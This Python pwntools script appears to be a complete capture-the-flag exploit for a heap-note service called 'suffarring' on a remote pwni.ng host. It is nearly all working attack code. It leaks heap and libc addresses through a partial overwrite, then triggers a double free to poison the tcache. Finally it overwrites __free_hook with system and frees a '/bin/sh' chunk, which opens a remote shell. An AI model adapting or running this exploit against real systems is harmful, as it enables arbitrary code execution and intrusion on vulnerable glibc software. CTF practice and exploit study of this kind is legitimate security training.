from pwn import *
from heaputils import get_PIE

def add(text):
	p.sendline("A")
	p.recvuntil("> ")
	p.sendline(str(len(text)))
	p.recvuntil("> ")
	p.send(text)

def count(text_idx,needle):
	p.sendline("C")
	p.recvuntil("> ")
	p.sendline(str(text_idx))
	p.recvuntil("> ")
	p.sendline(str(len(needle)))
	p.recvuntil("> ")
	p.send(needle)
	p.recvuntil("Occurrences: ")
	cnt = int(p.recvline())
	return cnt

def recant(text_idx,needle):
	p.sendline("R")
	p.recvuntil("Which text?")
	p.recvuntil("> ")
	p.sendline(str(text_idx))
	p.recvuntil("> ")
	p.sendline(str(len(needle)))
	p.recvuntil("> ")
	p.send(needle)

def delete(idx):
	p.sendline("D")
	p.recvuntil("Which text?")
	p.recvuntil("> ")
	p.sendline(str(idx))

def get(idx):
	p.sendline("P")
	p.recvuntil("Which text?")
	p.recvuntil("> ")
	p.sendline(str(idx))
	data = p.recvuntil("> ").strip("> ")
	return data

def debug():
	bp = [0x12C9,0x131E ]
	script = ""
	for x in bp:
		script+="b *0x%x\n"%(x+PIE)
	gdb.attach(p,gdbscript=script)


if __name__ == "__main__":

	libc = ELF("./libc.so.6")
	p = remote("suffarring.pwni.ng", 7361)
	
	# phase.1 partial overwrite to get heap leak

	payload = p64(0)*2 #our data
	payload += p64(0)+p64(0x31) #next heap header
	payload += p64(0x500)+chr(0)

	add("A"*0x10)
	add('')
	add(payload)
	add("Y"*8+"X"*0x1048)

	delete(1)
	recant(2, payload+"\x00")	
	delete(3)

	leak = get(2)
	HEAP = u64(leak[:8])
	LIBC = u64(leak[0x4d0:0x4d8]) - 0x7fac22b0aca0 + 0x7fac2271f000

	log.info("HEAP: 0x%x"%HEAP)
	log.info("LIBC: 0x%x"%LIBC)

	add('') # restore 1

	
	add('') #3

	victim_ptr = HEAP + 0x7f3111953fa0 - 0x7f31119534e0
	payload = p64(0)*2 #our data
	payload += p64(0)+p64(0x31) #next heap header
	payload += p64(0x500)+p64(victim_ptr) #trigger double free
	add(payload) #4

	add("V"*0x40) #5, 0x40 size tcache is our target
	add("/bin/sh\x00") #6 /bin/sh string to system()

	delete(3)
	recant(4,payload+"\x00")

	delete(5)
	delete(4)

	free_hook = LIBC + libc.symbols['__free_hook']
	system = LIBC + libc.symbols['system']

	add(p64(free_hook)*8)
	add(p64(0xdeadbeef)*8)
	add(p64(system)*8)#get free_hook allocated

	# free(/bin/sh) == system(/bin/sh)
	delete(6)

	p.interactive()